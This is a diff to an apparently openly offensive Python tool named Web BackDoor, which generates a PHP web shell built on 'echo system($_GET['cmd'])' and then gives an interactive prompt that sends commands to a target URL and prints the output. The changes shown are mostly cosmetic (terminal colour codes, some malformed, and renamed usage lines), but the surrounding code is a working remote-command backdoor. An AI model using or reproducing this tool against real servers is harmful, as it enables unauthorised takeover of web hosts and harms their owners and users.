@@ -6,7 +6,8 @@ import signal
 from  urllib.request import Request
 
 
-banner= """
+banner= """\33[92m
+
 
               _      ______            _       _                  
              | |     | ___ \          | |     | |                 
@@ -16,16 +17,16 @@ __      _____| |__   | |_/ / __ _  ___| | ____| | ___   ___  _ __
   \_/\_/ \___|_.__/  \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                                                   
 
-[ @intx0x80 ]
+\033[93m [ @intx0x80 ]
 
 
-"""
+\33[0 """
 
 
 
 parse=OptionParser("""
 
-
+\33[92m
 
               _      ______            _       _                  
              | |     | ___ \          | |     | |                 
@@ -35,6 +36,7 @@ __      _____| |__   | |_/ / __ _  ___| | ____| | ___   ___  _ __
   \_/\_/ \___|_.__/  \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                                                   
                                                                   
+\033[92m
 ./BackDoor.py [options]
 [options]
 
@@ -43,19 +45,19 @@ __      _____| |__   | |_/ / __ _  ___| | ____| | ___   ___  _ __
 
 
  usge                                          
-./web-backdoor.py -u http://127.0.0.1
-./web-backdoor.py -g shell
-./web-backdoor.py --url http://127.0.0.1
-./web-backdoor.py --generate shell
+./BackDoor.py -u http://127.0.0.1
+./BackDoor.py -g shell
+./BackDoor.py --url http://127.0.0.1
+./BackDoor.py --generate shell
 
-[ @intx0x80 ]
-
+\033[93m[ @intx0x80 ]
+\33[0
 """)
 
 
 def signal_handler(signal, frame):
 
-    print ("\n[-] Exiting")
+    print ("\033[91m"+"\n[-] Exiting"+"\033[0m")
 
     exit()
 
@@ -82,14 +84,14 @@ echo system($_GET['cmd']);
 
         opfile.write(evil_code)
         opfile.close()
-        print("[ "+shell +"]"+"    is Generated ...")
+        print("\33[93m"+"[ "+shell +"]"+"    is Generated ..."+"\33[0")
     if opt.url!=None and opt.gene==None:
         url=str(opt.url)
         print(banner)
-        print("Enter q to exit from shell\n")
+        print("\033[92m"+"Enter q to exit from shell\n"+"\033[92m")
         while True:
             #buff=""
-            cmd=str(input("$ "))
+            cmd=str(input("\033[92m"+"$ "+"\033[92m"))
             print("\n")
             if cmd=="q":
                 break
@@ -101,6 +103,6 @@ echo system($_GET['cmd']);
             reponse=str(openurl.read().decode("utf-8"))
             #soup=BeautifulSoup(reponse,"html.parser")
             #for i in soup
-            print(reponse.replace('\\n', '  \n'))
+            print("\33[95m"+reponse.replace('\\n', '  \n')+"\33[95m")
             #print(soup.get_text())
 
